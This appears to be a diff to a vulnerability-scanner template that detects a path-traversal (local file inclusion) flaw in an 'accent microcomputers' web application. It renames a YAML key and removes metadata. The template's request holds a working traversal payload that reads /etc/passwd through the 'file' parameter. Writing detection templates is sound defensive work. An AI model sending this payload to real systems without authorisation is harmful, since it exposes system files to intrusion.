@@ -13,10 +13,8 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: microcomputers,accent,lfi
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?id=50&file=../../../../../../../../../etc/passwd"
